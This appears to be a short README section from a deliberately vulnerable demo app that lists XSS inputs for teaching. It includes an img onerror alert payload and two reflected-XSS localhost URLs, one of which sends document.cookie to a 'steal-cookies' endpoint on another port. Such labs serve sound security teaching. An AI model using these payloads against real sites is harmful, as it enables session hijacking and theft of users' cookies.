## Vulnerable Services

### Self XSS

Try some inputs inputs in the first field:

- `<strong>cat`
- `<img src="doesnt exist" onerror="alert('I just executed some JavaScript, yikes!')">`

### Reflected XSS

Here's an example some URL which would be pretty naughty

- <http://localhost:8080/reflected-xss.html?first=%3Cimg%20src=%22doesnt%20exist%22%20onerror=%22alert(%27I%20just%20executed%20some%20JavaScript%20without%20any%20human%20interaction%20on%20the%20page!%27)%22%3E&autoSubmit=true>
- <http://localhost:8080/reflected-xss.html?first=%3Cimg%20src=%22doesnt%20exist%22%20onerror=%22fetch(`http://localhost:1337/steal-cookies?cookie=${encodeURIComponent(document.cookie)}`)%22%3E&autoSubmit=true>
